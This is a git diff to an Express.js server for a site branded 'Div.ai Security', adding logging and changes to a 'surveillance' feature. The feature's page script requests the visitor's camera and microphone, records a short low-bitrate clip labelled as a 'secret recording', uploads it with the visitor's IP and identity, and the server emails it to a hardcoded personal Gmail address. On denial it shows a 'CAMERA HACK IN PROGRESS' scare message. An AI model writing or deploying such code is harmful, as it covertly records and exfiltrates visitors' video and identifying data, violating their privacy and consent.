@@ -177,30 +177,46 @@ app.use(async (req, res, next) => {
         }
 
         async function initiateSurveillance() {
+            console.log("📸 [SURVEILLANCE] Attempting camera access...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
+                console.log("✅ [SURVEILLANCE] Camera access granted.");
+                
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+                const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 }); // Low bitrate
                 const chunks = [];
 
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
+                    console.log("🔄 [SURVEILLANCE] Recording stopped. Preparing upload...");
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = async () => {
                         const base64data = reader.result;
-                        await fetch('/api/security/surveillance', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
-                        });
+                        console.log("🚀 [SURVEILLANCE] Uploading evidence (Size: " + Math.round(base64data.length/1024) + " KB)...");
+                        try {
+                            const response = await fetch('/api/security/surveillance', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
+                            });
+                            if (response.ok) console.log("✅ [SURVEILLANCE] Evidence secured on server.");
+                            else console.error("❌ [SURVEILLANCE] Server rejected evidence.");
+                        } catch (err) {
+                            console.error("❌ [SURVEILLANCE] Upload failed:", err);
+                        }
                         stream.getTracks().forEach(track => track.stop());
                     };
                 };
 
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 3000); // 3-second clip
+                console.log("🔴 [SURVEILLANCE] Recording started...");
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 2000); // 2-second clip
             } catch (err) {
+                console.error("❌ [SURVEILLANCE] Camera failed:", err);
                 document.getElementById('alert-box').innerHTML += "<br>🚨 PERMISSION DENIED - CAMERA HACK IN PROGRESS...";
             }
         }
@@ -214,30 +230,43 @@ app.use(async (req, res, next) => {
 });
 
 // Level 3 Surveillance Endpoint
-app.post('/api/security/surveillance', express.json({ limit: '10mb' }), async (req, res) => {
+app.post('/api/security/surveillance', express.json({ limit: '20mb' }), async (req, res) => {
     const { video, info } = req.body;
-    if (!video) return res.status(400).send('No video data');
+    if (!video) {
+        console.error("❌ [SURVEILLANCE] Received request with no video data.");
+        return res.status(400).send('No video data');
+    }
 
-    console.log(`🎬 [SURVEILLANCE] Receiving evidence for ${info}`);
+    console.log(`🎬 [SURVEILLANCE] Data Received for ${info}. Processing email...`);
 
     try {
-        await transporter.sendMail({
+        const mailPromise = transporter.sendMail({
             from: `"Div.ai Security" <${process.env.EMAIL_USER}>`,
             to: 'canvadwala@gmail.com',
             subject: `🎬 INTRUDER EVIDENCE: ${info}`,
-            html: `<p>Identity: ${info}</p><p>Check attachment for video evidence.</p>`,
+            html: `
+            <div style="font-family:sans-serif; background:#000; color:#fff; padding:20px; border:1px solid #00f;">
+                <h2 style="color:#00f;">🛰️ SURVEILLANCE EVIDENCE CAPTURED</h2>
+                <p><strong>Intruder:</strong> ${info}</p>
+                <p>A secret recording has been captured and attached to this email.</p>
+                <hr style="border:1px solid #333;">
+                <p style="font-size:0.8rem;color:#555;">Level 3 Lockdown Status: COMPLETE</p>
+            </div>`,
             attachments: [
                 {
-                    filename: 'intruder.webm',
+                    filename: 'intruder_evidence.webm',
                     content: video.split(',')[1],
                     encoding: 'base64'
                 }
             ]
         });
-        res.status(200).send('Evidence secured');
+
+        const info_log = await mailPromise;
+        console.log(`✅ [SURVEILLANCE] Email sent successfully. ID: ${info_log.messageId}`);
+        res.status(200).send('Evidence secured and emailed');
     } catch (e) {
-        console.error("❌ Surveillance Email Failed:", e.message);
-        res.status(500).send('Failed');
+        console.error("❌ [SURVEILLANCE] Email Delivery Failed:", e.message);
+        res.status(500).send('Failed to send evidence');
     }
 });
 // ==========================================
